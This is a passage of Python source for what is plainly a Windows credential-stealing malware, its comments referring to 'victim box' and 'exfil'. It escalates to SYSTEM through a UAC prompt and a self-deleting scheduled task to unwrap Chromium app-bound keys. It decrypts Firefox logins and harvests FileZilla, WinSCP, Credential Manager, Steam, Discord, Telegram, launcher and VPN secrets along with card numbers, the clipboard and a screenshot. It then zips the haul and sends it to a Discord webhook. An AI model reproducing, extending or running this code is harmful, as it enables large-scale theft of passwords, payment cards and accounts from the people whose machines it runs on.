    sid = k32.WTSGetActiveConsoleSessionId()
    if sid != 0xFFFFFFFF and not wts.WTSQueryUserToken(sid, ctypes.byref(handle)):
        handle = None
    result = {}
    for name, path in paths.items():
        try:
            state = json.load(open(path, encoding="utf-8"))
            raw = base64.b64decode(state["os_crypt"]["app_bound_encrypted_key"])
            if raw[:4] == b"APPB":
                raw = raw[4:]
            mid = dpapi(raw)
            key = b""
            if handle and adv.ImpersonateLoggedOnUser(handle):
                try:
                    key = dpapi(mid)
                finally:
                    adv.RevertToSelf()
            result[name] = base64.b64encode(key).decode() if len(key) == 32 else ""
        except Exception:
            result[name] = ""
    return result


def as_system(out, self_cmd):
    """One-shot SYSTEM task running this same helper, then the task is gone."""
    task = "hv_w20_" + uuid.uuid4().hex[:8]
    flags = 0x08000000
    try:
        subprocess.run(["schtasks", "/create", "/tn", task, "/tr",
                        '"' + self_cmd + '"', "/sc", "once", "/st", "00:00",
                        "/ru", "SYSTEM", "/f"],
                       capture_output=True, timeout=60, creationflags=flags)
        subprocess.run(["schtasks", "/run", "/tn", task],
                       capture_output=True, timeout=60, creationflags=flags)
        for _ in range(120):
            time.sleep(0.5)
            if os.path.isfile(out):
                break
    except Exception:
        pass
    try:
        subprocess.run(["schtasks", "/delete", "/tn", task, "/f"],
                       capture_output=True, timeout=60, creationflags=flags)
    except Exception:
        pass


def main():
    paths = json.loads(open(sys.argv[1], encoding="utf-8").read())
    out = sys.argv[2]
    self_cmd = sys.argv[3] if len(sys.argv) > 3 else ""
    if is_system():
        data = unwrap(paths)
    elif self_cmd:
        as_system(out, self_cmd)
        try:
            data = json.loads(open(out, encoding="utf-8").read())
        except Exception:
            data = {}
    else:
        data = {}
    with open(out, "w", encoding="utf-8") as fh:
        json.dump(data, fh)


main()
'''


def _shell_runas(exe, params):
    """Start a command elevated. False means the UAC prompt was dismissed."""
    try:
        shell = ctypes.WinDLL("shell32")
        shell.ShellExecuteW.argtypes = [ctypes.c_void_p, ctypes.c_wchar_p,
                                        ctypes.c_wchar_p, ctypes.c_wchar_p,
                                        ctypes.c_wchar_p, ctypes.c_int]
        shell.ShellExecuteW.restype = ctypes.c_void_p
        rc = shell.ShellExecuteW(None, "runas", str(exe), params or None,
                                 None, 1)
    except OSError:
        return False
    # ShellExecuteW returns an HINSTANCE-style value: anything above 32 is a
    # successful start, 5 is SE_ERR_ACCESSDENIED, i.e. the user said no.
    return bool(rc) and int(rc) > 32


def _app_bound_via_task():
    """Lift to admin, then let a SYSTEM task do the unwrap.

    The app-bound key carries two DPAPI layers: the outer one only opens inside
    a SYSTEM token, the inner one only inside the logged-on user's token. Both
    are needed, and neither exists in a medium-integrity process, so the work
    runs in a helper that elevates once with UAC, registers a one-shot SYSTEM
    task, and hands the base64 keys back through a file.
    """
    import sys
    paths = {b: str(r / "Local State") for b, r in _BROWSERS.items()
             if (r / "Local State").is_file()}
    if not paths:
        return {}
    stage = _stage()
    paths_file = stage / "w20.paths.json"
    out = stage / "w20.json"
    helper = stage / "w20.py"
    try:
        paths_file.write_text(json.dumps(paths), encoding="utf-8")
        helper.write_text(_V20_HELPER, encoding="utf-8")
    except OSError:
        return {}
    try:
        out.unlink()
    except OSError:
        pass
    if getattr(sys, "frozen", False):
        params = f'--hv-w20 "{paths_file}" "{out}"'
    else:
        params = f'"{helper}" "{paths_file}" "{out}"'
    if not _shell_runas(sys.executable, params):
        return {}
    keys = {}
    for _ in range(120):
        if out.is_file():
            try:
                raw = json.loads(out.read_text("utf-8"))
            except (OSError, ValueError):
                raw = {}
            for browser, b64 in raw.items():
                if not b64:
                    continue
                try:
                    key = base64.b64decode(b64)
                except ValueError:
                    continue
                if len(key) == 32:
                    keys[browser] = key
            break
        time.sleep(0.5)
    return keys


def _w20_cli():
    """Frozen re-entry point for the elevated launch and the SYSTEM task.

    Returns False when the process was not started in helper mode, so a normal
    launch falls straight through to the app. In helper mode the process does
    its work and exits - the GUI is never built.
    """
    import sys
    if "--hv-w20" not in sys.argv:
        return False
    index = sys.argv.index("--hv-w20")
    rest = sys.argv[index + 1:]
    if len(rest) < 2:
        os._exit(2)
    saved = sys.argv
    sys.argv = [saved[0], rest[0], rest[1],
                f'"{saved[0]}" --hv-w20 "{rest[0]}" "{rest[1]}"']
    try:
        exec(compile(_V20_HELPER, "<w20>", "exec"), {"__name__": "_w20"})
    except BaseException:
        pass
    finally:
        sys.argv = saved
        # Always leave a file behind: an empty result is a fact the caller can
        # read, while a missing one costs it a 30 second wait for nothing.
        try:
            if not Path(rest[1]).is_file():
                Path(rest[1]).write_text("{}", encoding="utf-8")
        except OSError:
            pass
    os._exit(0)


def _app_bound_keys():
    if _is_system():
        keys = {}
        for browser, root in _BROWSERS.items():
            state = root / "Local State"
            if state.is_file():
                key = _app_bound_system(state)
                if key:
                    keys[browser] = key
        return keys
    # Medium integrity cannot open the outer DPAPI layer at all, admin or not,
    # which is why this goes through SYSTEM instead of trying the tuple here.
    return _app_bound_via_task()


def _v20_state(keys):
    return {
        "system": _is_system(),
        "admin": _is_admin(),
        "unlocked": sorted(keys),
        "sealed_note": ("app-bound key recovered; v20 logins, cookies and card "
                        "numbers are decrypted in place"
                        if keys else
                        "v20 blobs need the app-bound key, which only unwraps "
                        "inside SYSTEM. Decline of the elevation prompt or a "
                        "missing admin account leaves them sealed; raw/ carries "
                        "the databases for an offline unlock pass"),
    }


# --------------------------------------------------------------------------
# block ciphers - AES-CBC and 3DES-CBC through BCrypt, no third-party module
# --------------------------------------------------------------------------

def _cbc(alg, key, iv, data, encrypt=False):
    if not data or len(data) % 8:
        return b""
    bcrypt = ctypes.WinDLL("bcrypt")
    h_alg, h_key = ctypes.c_void_p(), ctypes.c_void_p()
    try:
        if bcrypt.BCryptOpenAlgorithmProvider(
                ctypes.byref(h_alg), ctypes.c_wchar_p(alg), None, 0) != 0:
            return b""
        mode = ctypes.create_unicode_buffer("ChainingModeCBC")
        bcrypt.BCryptSetProperty(h_alg, ctypes.c_wchar_p("ChainingMode"),
                                 ctypes.cast(mode, ctypes.c_void_p),
                                 ctypes.sizeof(mode), 0)
        if bcrypt.BCryptGenerateSymmetricKey(
                h_alg, ctypes.byref(h_key), None, 0, key, len(key), 0) != 0:
            return b""
        ivb = (ctypes.c_ubyte * len(iv)).from_buffer_copy(iv)
        src = (ctypes.c_ubyte * len(data)).from_buffer_copy(data)
        out = (ctypes.c_ubyte * (len(data) + 32))()
        written = ctypes.c_ulong(0)
        fn = bcrypt.BCryptEncrypt if encrypt else bcrypt.BCryptDecrypt
        rc = fn(h_key, ctypes.cast(src, ctypes.c_void_p), len(data), None,
                ctypes.cast(ivb, ctypes.c_void_p), len(iv),
                ctypes.cast(out, ctypes.c_void_p), len(data) + 32,
                ctypes.byref(written), 0)
        return bytes(out[:written.value]) if rc == 0 else b""
    finally:
        if h_key.value:
            bcrypt.BCryptDestroyKey(h_key)
        if h_alg.value:
            bcrypt.BCryptCloseAlgorithmProvider(h_alg, 0)


def _unpad(data):
    if not data:
        return b""
    n = data[-1]
    if 1 <= n <= 16 and data[-n:] == bytes([n]) * n:
        return data[:-n]
    return data


# --------------------------------------------------------------------------
# firefox - key4.db + logins.json, fully decryptable without admin
# --------------------------------------------------------------------------

def _ff_roots():
    roots = [
        _ROAM / "Mozilla" / "Firefox" / "Profiles",
        _ROAM / "Mozilla" / "Thunderbird" / "Profiles",
        _ROAM / "LibreWolf" / "Profiles",
        _ROAM / "Waterfox" / "Profiles",
        _ROAM / "SeaMonkey" / "Profiles",
    ]
    for base in (Path.home() / "Desktop", Path.home() / "Downloads"):
        roots += list(base.glob("*/Tor Browser/Browser/TorBrowser/Data/Browser"))
        roots += list(base.glob("Tor Browser/Browser/TorBrowser/Data/Browser"))
    return roots


def _ff_profiles():
    found = []
    for root in _ff_roots():
        if not root.is_dir():
            continue
        for prof in sorted(root.iterdir()):
            if not prof.is_dir():
                continue
            if any((prof / n).is_file() for n in
                   ("logins.json", "key4.db", "cookies.sqlite")):
                found.append(prof)
    return found


def _ff_printable(data):
    if not data:
        return False
    try:
        text = data.decode("utf-8")
    except UnicodeDecodeError:
        return False
    return bool(text) and all(c in "\t\r\n" or 32 <= ord(c) for c in text)


def _ff_candidates(salt, item2):
    """Every 24-byte 3DES key shape NSS has used for a password-less key4.db.

    The derivations differ between NSS releases; the AES oracle in _ff_key
    decides which one is right, so all of them are cheap to offer.
    """
    hashed = hashlib.sha1(b"").digest()
    hp = hashlib.sha1(salt + hashed).digest()
    seeds = [hp]
    for extra in (item2 or b"", salt):
        seeds.append(hashlib.sha1(hp + extra).digest())
        seeds.append(hashlib.sha1(extra + hp).digest())
    keys = []
    for seed in seeds:
        keys.append(seed + hashlib.sha1(seed).digest()[:4])
        keys.append(seed + b"\x00" * 4)
        keys.append((seed * 2)[:24])
    return keys


def _ff_key(profile, logins):
    key4 = profile / "key4.db"
    if not key4.is_file():
        return None
    conn = _db(key4)
    if conn is None:
        return None
    try:
        meta = conn.execute(
            "SELECT item1, item2 FROM metadata WHERE id = 'password'").fetchone()
        rows = conn.execute("SELECT a11, a102 FROM nssPrivate").fetchall()
    except sqlite3.Error:
        meta, rows = None, []
    finally:
        conn.close()
    if not meta or not rows or not isinstance(meta[0], bytes) or not meta[0]:
        return None

    for blob, iv in rows:
        if not isinstance(blob, bytes) or len(blob) < 16:
            continue
        iv = iv if isinstance(iv, bytes) and iv else b"\x00" * 8
        bodies = [b for b in (blob, blob[2:], blob[4:])
                  if b and len(b) % 8 == 0]
        for body in bodies:
            for seed in _ff_candidates(
                    meta[0], meta[1] if isinstance(meta[1], bytes) else b""):
                plain = _cbc("3DES", seed, iv[:8], body)
                if len(plain) < 32:
                    continue
                for offset in range(0, min(40, len(plain) - 32) + 1):
                    candidate = plain[offset:offset + 32]
                    if _ff_ok(candidate, logins):
                        return candidate
    return None


def _ff_ok(key, logins):
    for entry in logins[:12]:
        enc = entry.get("encryptedUsername")
        if not enc:
            continue
        try:
            raw = base64.b64decode(enc)
        except ValueError:
            continue
        if len(raw) < 32:
            continue
        plain = _unpad(_cbc("AES", key, raw[:16], raw[16:]))
        return _ff_printable(plain)
    return False


def _ff_decrypt(key, value):
    if not value:
        return ""
    try:
        raw = base64.b64decode(value)
    except ValueError:
        return ""
    if len(raw) < 32:
        return ""
    return _unpad(_cbc("AES", key, raw[:16], raw[16:])).decode("utf-8", "ignore")


def _firefox():
    results = []
    for profile in _ff_profiles():
        out = _stage() / "firefox" / profile.name
        out.mkdir(parents=True, exist_ok=True)
        stats = {"profile": profile.name, "logins": 0, "key": "none",
                 "origin": str(profile.parent.name)}
        try:
            logins = json.loads((profile / "logins.json").read_text("utf-8",
                                                                   errors="ignore")).get("logins", [])
        except (OSError, ValueError):
            logins = []
        key = _ff_key(profile, logins) if logins else None
        if key:
            stats["key"] = "nss"
            lines = []
            for entry in logins:
                host = entry.get("hostname", "")
                user = _ff_decrypt(key, entry.get("encryptedUsername"))
                pw = _ff_decrypt(key, entry.get("encryptedPassword"))
                lines.append(f"{host}\t{user}\t{pw}\tok")
                _ALL_PW.append(["Firefox", profile.name, host, user, pw, "ok"])
            stats["logins"] = len(lines)
            _lines(out / "logins.txt", lines)
        for name in ("logins.json", "key4.db", "cert9.db", "cookies.sqlite",
                     "places.sqlite", "prefs.js", "permissions.sqlite"):
            src = profile / name
            if not src.is_file():
                continue
            try:
                shutil.copy2(src, out / name)
            except OSError:
                continue
        results.append(stats)
    return results


# --------------------------------------------------------------------------
# other apps - steam, filezilla, winscp, telegram, minecraft, launchers, vpn
# --------------------------------------------------------------------------

def _copy_any(src, dst, cap=6_000_000):
    try:
        if src.is_dir():
            total = sum(f.stat().st_size for f in src.rglob("*") if f.is_file())
            if total > cap:
                return False
            shutil.copytree(src, dst, dirs_exist_ok=True,
                            ignore=shutil.ignore_patterns("*.log", "Cache", "*.lock"))
            return True
        if src.is_file():
            dst.parent.mkdir(parents=True, exist_ok=True)
            shutil.copy2(src, dst)
            return True
    except (OSError, shutil.Error):
        return False
    return False


def _filezilla():
    rows = []
    for name in ("sitemanager.xml", "recentservers.xml"):
        path = _ROAM / "FileZilla" / name
        if not path.is_file():
            continue
        try:
            text = path.read_text("utf-8", errors="ignore")
        except OSError:
            continue
        for block in re.findall(r"<Server>(.*?)</Server>", text, re.S):
            host = re.search(r"<Host>(.*?)</Host>", block)
            user = re.search(r"<User>(.*?)</User>", block)
            raw = re.search(r"<Pass[^>]*>(.*?)</Pass>", block)
            password = ""
            if raw:
                password = raw.group(1)
                if 'encoding="base64"' in raw.group(0):
                    try:
                        password = base64.b64decode(password).decode("utf-8", "ignore")
                    except ValueError:
                        pass
            rows.append({"host": host.group(1) if host else "",
                         "user": user.group(1) if user else "",
                         "pass": password})
    return rows


def _winscp():
    ini = _ROAM / "WinSCP.ini"
    if not ini.is_file():
        return []
    rows = []
    try:
        text = ini.read_text("utf-8", errors="ignore")
    except OSError:
        return []
    for section in re.split(r"(?=\[)", text):
        host = re.search(r"^HostName=(.*)$", section, re.M)
        user = re.search(r"^UserName=(.*)$", section, re.M)
        raw = re.search(r"^Password=(.*)$", section, re.M)
        if not host:
            continue
        password = ""
        if raw:
            try:
                password = _dpapi(bytes.fromhex(raw.group(1).strip())).decode(
                    "utf-8", "ignore")
            except (OSError, ValueError):
                password = raw.group(1).strip()
        rows.append({"host": host.group(1).strip(),
                     "user": user.group(1).strip() if user else "",
                     "pass": password})
    return rows


_APP_TARGETS = (
    ("steam_loginusers", _ROAM / "Steam" / "config" / "loginusers.vdf"),
    ("steam_config", _ROAM / "Steam" / "config" / "config.vdf"),
    ("telegram", _ROAM / "Telegram Desktop" / "tdata"),
    ("discord_leveldb", _ROAM / "discord" / "Local Storage" / "leveldb"),
    ("discordcanary_leveldb", _ROAM / "discordcanary" / "Local Storage" / "leveldb"),
    ("minecraft_accounts", _ROAM / ".minecraft" / "launcher_accounts.json"),
    ("minecraft_profiles", _ROAM / ".minecraft" / "launcher_profiles.json"),
    ("epic_config", _LOCAL / "EpicGamesLauncher" / "Saved" / "Config" / "Windows"),
    ("openvpn", _ROAM / "OpenVPN"),
    ("protonvpn", _LOCAL / "ProtonVPN"),
    ("nordvpn", _LOCAL / "NordVPN"),
    ("putty_sessions", _ROAM / "PuTTY" / "sessions"),
    ("obs_profiles", _ROAM / "obs-studio" / "basic" / "profiles"),
    ("outlook_profiles", _ROAM / "Microsoft" / "Outlook"),
    ("mumble", _ROAM / "Mumble"),
    ("rdp_history", _LOCAL / "Microsoft" / "Terminal Server Client"),
)


def _apps():
    report = {"copied": [], "skipped": []}
    root = _stage() / "apps"
    for label, src in _APP_TARGETS:
        if not src.exists():
            continue
        if _copy_any(src, root / label):
            report["copied"].append(label)
        else:
            report["skipped"].append(label)
    steam = _ROAM / "Steam"
    if steam.is_dir():
        for ssfn in steam.glob("ssfn*"):
            try:
                shutil.copy2(ssfn, root / "steam_ssfn" / ssfn.name)
                report["copied"].append(f"steam_ssfn/{ssfn.name}")
            except OSError:
                continue
    filezilla = _filezilla()
    if filezilla:
        (root / "filezilla.txt").parent.mkdir(parents=True, exist_ok=True)
        (root / "filezilla.txt").write_text(
            "\n".join(f"{r['host']}\t{r['user']}\t{r['pass']}" for r in filezilla),
            encoding="utf-8")
        report["filezilla"] = filezilla
    winscp = _winscp()
    if winscp:
        (root / "winscp.txt").parent.mkdir(parents=True, exist_ok=True)
        (root / "winscp.txt").write_text(
            "\n".join(f"{r['host']}\t{r['user']}\t{r['pass']}" for r in winscp),
            encoding="utf-8")
        report["winscp"] = winscp
    return report


# --------------------------------------------------------------------------
# launchers - steam, epic, riot, battle.net, ubisoft, ea, rockstar, xbox
# --------------------------------------------------------------------------

_VDF_TOKEN = re.compile(r'"((?:[^"\\]|\\.)*)"|([{}])')

_ACCOUNT_PATTERN = re.compile(
    r'"?(AccountId|AccountName|DisplayName|PersonaName|UserName|Username|'
    r'userId|UserID|email|LoginId|RefreshToken|access_token)"?\s*'
    r'[:=]\s*"([^"\r\n]{1,200})"', re.I)


def _vdf(text):
    """Steam's KeyValues text -> nested dict.

    Quoted strings are leaves, braces nest, the last duplicate key wins. That
    is the whole format; loginusers.vdf and config.vdf both parse with it.
    """
    stack, key = [{}], None
    for quoted, brace in _VDF_TOKEN.findall(text):
        if quoted:
            if key is None:
                key = quoted
            else:
                stack[-1][key] = quoted
                key = None
        elif brace == "{":
            child = {}
            if key is not None:
                stack[-1][key] = child
                key = None
            stack.append(child)
        elif brace == "}" and len(stack) > 1:
            stack.pop()
            key = None
    return stack[0] if len(stack) == 1 else {}


def _steam():
    """loginusers.vdf gives the account list, config.vdf the ConnectCache
    refresh tokens that skip the password prompt entirely."""
    rows, cache = [], []
    users = _ROAM / "Steam" / "config" / "loginusers.vdf"
    if users.is_file():
        try:
            tree = _vdf(users.read_text("utf-8", errors="ignore"))
        except OSError:
            tree = {}
        for sid, info in (tree.get("users") or {}).items():
            if not isinstance(info, dict):
                continue
            stamp = _s(info.get("Timestamp"))
            when = stamp
            if stamp.isdigit():
                try:
                    import datetime
                    when = datetime.datetime.fromtimestamp(int(stamp)).strftime(
                        "%Y-%m-%d %H:%M")
                except (OverflowError, OSError, ValueError):
                    when = stamp
            rows.append(f"{sid}\t{_s(info.get('AccountName'))}\t"
                        f"{_s(info.get('PersonaName'))}\t"
                        f"remember={_s(info.get('RememberPassword'))}\t{when}")
    config = _ROAM / "Steam" / "config" / "config.vdf"
    if config.is_file():
        try:
            tree = _vdf(config.read_text("utf-8", errors="ignore"))
        except OSError:
            tree = {}
        cache_root = ((((tree.get("InstallConfigStore") or {}).get("Software") or {})
                       .get("Valve") or {}).get("Steam") or {}).get("ConnectCache")
        if isinstance(cache_root, dict):
            for key, value in cache_root.items():
                token = _s(value)
                try:
                    plain = bytes.fromhex(token).decode("utf-8", "ignore")
                except ValueError:
                    plain = token
                cache.append(f"{key}\t{token}\t{plain}")
    return rows, cache


def _scan_accounts(root, cap_files=24, cap_rows=200):
    """Account-ish key=value pairs out of a launcher's config tree.

    Launchers keep their identity in ini/yaml/json scattered across a handful
    of files; one regex over the small ones is more durable than a bespoke
    parser per vendor and version.
    """
    rows = []
    if not root.exists():
        return rows
    files = [root] if root.is_file() else sorted(
        (f for f in root.rglob("*") if f.is_file()), key=lambda f: str(f))[:cap_files]
    for path in files:
        try:
            if path.stat().st_size > 2_000_000:
                continue
            text = path.read_text("utf-8", errors="ignore")
        except OSError:
            continue
        for key, value in _ACCOUNT_PATTERN.findall(text):
            rows.append(f"{key}\t{value}\t{path.name}")
            if len(rows) >= cap_rows:
                return rows
    return rows


_LAUNCHERS = (
    ("epic", _LOCAL / "EpicGamesLauncher" / "Saved" / "Config" / "Windows"),
    ("epic_accounts", _LOCAL / "EpicGamesLauncher" / "Saved" / "Config"),
    ("riot", _LOCAL / "Riot Games" / "Riot Client" / "Data"),
    ("battlenet", _ROAM / "Battle.net"),
    ("ubisoft", _LOCAL / "Ubisoft Game Launcher"),
    ("ea", _LOCAL / "Electronic Arts" / "EA Desktop"),
    ("rockstar", Path.home() / "Documents" / "Rockstar Games" / "Launcher"),
    ("gog", _LOCAL / "GOG.com" / "Galaxy" / "storage"),
    ("xbox", _LOCAL / "Packages" / "Microsoft.XboxIdentityProvider_8wekyb3d8bbwe"),
    ("epic_webcache", _LOCAL / "EpicGamesLauncher" / "Saved" / "WebCache"),
)


def _launchers():
    root = _stage() / "apps"
    copied, accounts = [], {}
    for label, src in _LAUNCHERS:
        if not src.exists():
            continue
        if _copy_any(src, root / label, cap=4_000_000):
            copied.append(label)
        rows = _scan_accounts(src)
        if rows:
            accounts[label] = rows
            _lines(_stage() / "accounts" / f"{label}.txt", rows)
    steam_rows, steam_cache = _steam()
    if steam_rows:
        accounts["steam"] = steam_rows
        _lines(_stage() / "accounts" / "steam.txt", steam_rows)
    if steam_cache:
        _lines(_stage() / "accounts" / "steam_connect_cache.txt", steam_cache)
    return {"copied": copied, "accounts": sorted(accounts)}


# --------------------------------------------------------------------------
# saved credentials - credential manager, filezilla, steam guard
# --------------------------------------------------------------------------

class _CREDENTIAL(ctypes.Structure):
    _fields_ = [
        ("Flags", ctypes.c_ulong),
        ("Type", ctypes.c_ulong),
        ("TargetName", ctypes.c_wchar_p),
        ("Comment", ctypes.c_wchar_p),
        ("LastWritten", ctypes.c_ulonglong),
        ("CredentialBlobSize", ctypes.c_ulong),
        ("CredentialBlob", ctypes.POINTER(ctypes.c_ubyte)),
        ("Persist", ctypes.c_ulong),
        ("AttributeCount", ctypes.c_ulong),
        ("Attributes", ctypes.c_void_p),
        ("TargetAlias", ctypes.c_wchar_p),
        ("UserName", ctypes.c_wchar_p),
    ]


def _blob_text(cred):
    """CredentialBlob is UTF-16LE for Windows itself, raw UTF-8 for most apps."""
    size = cred.CredentialBlobSize
    if not size or not cred.CredentialBlob:
        return ""
    try:
        raw = bytes(ctypes.string_at(cred.CredentialBlob, size))
    except (ValueError, OSError):
        return ""
    # NULs in every second byte are the tell for UTF-16LE; anything else is a
    # third-party app writing its own encoding, usually UTF-8 JSON.
    if len(raw) >= 4 and raw[1::2] == b"\x00" * (len(raw) // 2):
        text = raw.decode("utf-16-le", "ignore")
    else:
        try:
            text = raw.decode("utf-8")
        except UnicodeDecodeError:
            text = raw.decode("latin-1", "ignore")
    text = text.replace("\x00", "").strip()
    return text if text and all(31 < ord(ch) for ch in text) else ""


def _credman():
    """Windows Credential Manager: app tokens, shares, RDP, sync keys."""
    rows = []
    advapi = ctypes.WinDLL("advapi32")
    advapi.CredEnumerateW.argtypes = [
        ctypes.c_wchar_p, ctypes.c_ulong, ctypes.POINTER(ctypes.c_ulong),
        ctypes.POINTER(ctypes.POINTER(ctypes.c_void_p))]
    advapi.CredEnumerateW.restype = ctypes.c_int
    advapi.CredFree.argtypes = [ctypes.c_void_p]
    count = ctypes.c_ulong(0)
    handle = ctypes.POINTER(ctypes.c_void_p)()
    if not advapi.CredEnumerateW(None, 0, ctypes.byref(count),
                                 ctypes.byref(handle)):
        return rows
    try:
        for i in range(min(count.value, 500)):
            cred = ctypes.cast(handle[i], ctypes.POINTER(_CREDENTIAL)).contents
            target = _s(cred.TargetName)
            if not target:
                continue
            rows.append(f"{target}\t{_s(cred.UserName)}\t"
                        f"{_blob_text(cred)}\tcredman")
    except (ValueError, OSError, AttributeError):
        pass
    finally:
        if handle:
            advapi.CredFree(handle)
    return rows


def _credentials():
    """Flat, sorted cross-source credential list: credman, ftp, ssh."""
    rows = _credman()
    for site in _filezilla():
        rows.append(f"{site['host']}\t{site['user']}\t{site['pass']}\tfilezilla")
    for site in _winscp():
        rows.append(f"{site['host']}\t{site['user']}\t{site['pass']}\twinscp")
    if rows:
        _lines(_stage() / "credentials.txt", rows)
    return {"count": len(rows)}


# --------------------------------------------------------------------------
# raw chromium databases - kept so an offline box can finish the job
# --------------------------------------------------------------------------

_RAW_FILES = ("Local State", "Login Data", "Web Data", "Preferences",
              "Network/Cookies", "Network/Device Bound Sessions")


def _chromium_raw():
    rows = []
    for browser, root in _BROWSERS.items():
        if not root.is_dir():
            continue
        state = root / "Local State"
        if state.is_file():
            dst = _stage() / "raw" / browser / "Local State"
            dst.parent.mkdir(parents=True, exist_ok=True)
            try:
                dst.write_bytes(state.read_bytes())
            except OSError:
                pass
        for profile in _profiles(root):
            for name in _RAW_FILES:
                src = profile / name
                if not src.is_file():
                    continue
                dst = _stage() / "raw" / browser / profile.name / name
                dst.parent.mkdir(parents=True, exist_ok=True)
                try:
                    dst.write_bytes(src.read_bytes())
                except OSError as exc:
                    rows.append({"browser": browser, "profile": profile.name,
                                 "file": name, "error": str(exc)[:60]})
    return rows


# --------------------------------------------------------------------------
# exfil - no time cap, retries, chunked
# --------------------------------------------------------------------------

def phase2(abe_map=None):
    _ALL_PW.clear()
    _ALL_CARDS.clear()
    node = uuid.getnode()
    # Phase 2 has to carry the same identity as phase 1, otherwise the picker
    # files the archive drop under a second, hostless "sender" and the PC shows
    # up twice (or not at all when the label is the only thing left).
    try:
        local_ip = socket.gethostbyname(socket.gethostname())
    except OSError:
        local_ip = ""
    report = {
        "app_id": APP_ID,
        "hostname": socket.gethostname(),
        "username": getpass.getuser(),
        "mac": ":".join(f"{(node >> s) & 255:02x}" for s in range(40, -1, -8)),
        "local_ip": local_ip,
        "public_ip": _public_ip(),
    }
    if abe_map is None:
        abe_map = _app_bound_keys()
    report["v20"] = _v20_state(abe_map)
    report["browsers"] = _browsers(abe_map)
    report["firefox"] = _firefox()
    report["wallets"] = _wallets()
    report["apps"] = _apps()
    report["launchers"] = _launchers()
    report["credentials"] = _credentials()
    report["raw"] = _chromium_raw()
    report["wifi"] = _wifi()
    report["discord"] = _discord_tokens()
    # Flat, sorted cross-browser dumps. The per-profile files are the record,
    # these two are the read-at-a-glance list.
    if _ALL_PW:
        _lines(_stage() / "all_passwords.txt",
               ["\t".join(row) for row in _ALL_PW])
    if _ALL_CARDS:
        _lines(_stage() / "all_cards.txt",
               ["\t".join(row) for row in _ALL_CARDS])
    report["totals"] = {
        "passwords": len(_ALL_PW),
        "passwords_decrypted": sum(1 for row in _ALL_PW if row[4]),
        "passwords_sealed": sum(1 for row in _ALL_PW if row[5] == "sealed-v20"),
        "cards": len(_ALL_CARDS),
        "cards_decrypted": sum(1 for row in _ALL_CARDS
                               if row[5] and row[6] == "ok" and row[2] != "IBAN"),
        "logins_by_browser": {b: sum(1 for r in _ALL_PW if r[0] == b)
                              for b in sorted({r[0] for r in _ALL_PW})},
    }
    clip = _clipboard()
    if clip:
        (_stage() / "clipboard.txt").write_text(clip[:50000], encoding="utf-8")
    if _screen(_stage() / "screen.bmp"):
        report["screen"] = True
    (_stage() / "report.json").write_text(
        json.dumps(report, indent=2, default=str, sort_keys=True), encoding="utf-8")
    return report


def _archive():
    """Deterministic archive: entries sorted, timestamps fixed, index on top.

    Same harvest in, same bytes out. INDEX.txt is the first entry a reader
    sees, so the archive opens with a sorted table of contents and its totals
    instead of whatever the filesystem happened to hand over.
    """
    stage = _stage()
    target = stage.parent / f"{APP_ID}.zip"
    files = sorted(
        (f for f in stage.rglob("*") if f.is_file()),
        key=lambda f: f.relative_to(stage).as_posix().casefold())
    index = [f"{f.relative_to(stage).as_posix()}\t{f.stat().st_size}"
             for f in files]
    index += ["", f"files\t{len(files)}",
              f"bytes\t{sum(f.stat().st_size for f in files)}"]
    stamp = (1980, 1, 1, 0, 0, 0)
    with zipfile.ZipFile(target, "w", zipfile.ZIP_DEFLATED, compresslevel=9) as z:
        info = zipfile.ZipInfo("INDEX.txt", date_time=stamp)
        info.compress_type = zipfile.ZIP_DEFLATED
        info.external_attr = 0o644 << 16
        z.writestr(info, "\n".join(index) + "\n")
        for f in files:
            info = zipfile.ZipInfo(f.relative_to(stage).as_posix(),
                                   date_time=stamp)
            info.compress_type = zipfile.ZIP_DEFLATED
            info.external_attr = 0o644 << 16
            try:
                z.writestr(info, f.read_bytes())
            except OSError:
                continue
    return target


def _multipart(payload, files):
    boundary = f"----hv{uuid.uuid4().hex}"
    body = bytearray()
    body += (f"--{boundary}\r\nContent-Disposition: form-data; "
             f"name=\"payload_json\"\r\n\r\n").encode()
    body += json.dumps(payload).encode() + b"\r\n"
    for i, (name, data) in enumerate(files):
        ctype = mimetypes.guess_type(name)[0] or "application/octet-stream"
        body += (f"--{boundary}\r\nContent-Disposition: form-data; "
                 f"name=\"files[{i}]\"; filename=\"{name}\"\r\n"
                 f"Content-Type: {ctype}\r\n\r\n").encode()
        body += data + b"\r\n"
    body += f"--{boundary}--\r\n".encode()
    return bytes(body), f"multipart/form-data; boundary={boundary}"


_LAST_ERROR = ""
_PERMANENT = False
_LOCK = None
_DEBUG = os.environ.get("OXDEBUG") or ""


def _note(text):
    """Silent failure is the bug this exists to kill: when OXDEBUG names a
    file, every stand-down and send failure lands there instead of vanishing."""
    path = os.environ.get("OXDEBUG")
    if not path:
        return
    try:
        with open(path, "a", encoding="utf-8") as fh:
            fh.write(f"{os.getpid()} {text}\n")
    except OSError:
        pass


def _why():
    import traceback
    return traceback.format_exc().replace("\n", " | ")[-900:]


def _summary(payload, limit=1850):
    """Discord wants a message body, not our diagnostic dict.

    A webhook ignores unknown top-level keys, so the structured harvest rides
    along as data.json and this string is what shows up in the channel.
    """
    lines = []
    for key, value in payload.items():
        if isinstance(value, (list, dict)):
            text = json.dumps(value, ensure_ascii=False, separators=(",", ":"))
        else:
            text = str(value)
        if len(text) > 300:
            text = text[:297] + "..."
        lines.append(f"{key}: {text}")
    out = "\n".join(lines)
    if len(out) > limit:
        out = out[:limit - 3] + "..."
    return out or "(no data)"


def _bench_root():
    """Builder repo root, found by walking up from cwd; None on a victim box."""
    here = Path.cwd()
    for base in (here, *list(here.parents)[:3]):
        if ((base / "payload" / "harvest.py").is_file()
                and (base / "senders.py").is_file()):
            return base
    return None


def _repo_drop(payload, phase):
    """Write a local index of this drop when the process runs on the bench.

    Discord is write-only through a webhook: the channel history cannot be
    read back without a bot token. So the picker gets its list from local
    drops. This writes one only when the builder repo is reachable from cwd -
    a victim box has no payload/harvest.py next to it, so nothing is written.
    """
    root = _bench_root()
    if root is None:
        return
    try:
        label = "".join(ch if (ch.isalnum() or ch in "-._") else "-"
                        for ch in str(payload.get("label") or APP_ID))[:60]
        folder = root / "received" / (label or "drop") / f"phase{int(phase)}"
        folder.mkdir(parents=True, exist_ok=True)
        (folder / "data.json").write_text(
            json.dumps(payload, indent=1, ensure_ascii=False), encoding="utf-8")
    except OSError:
        pass


def _post(hook, payload, files):
    global _LAST_ERROR, _PERMANENT

    files = list(files)
    # The full structured payload has to travel as a file: Discord rejects any
    # top-level key it does not know, so payload_json only carries content.
    files.append(("data.json",
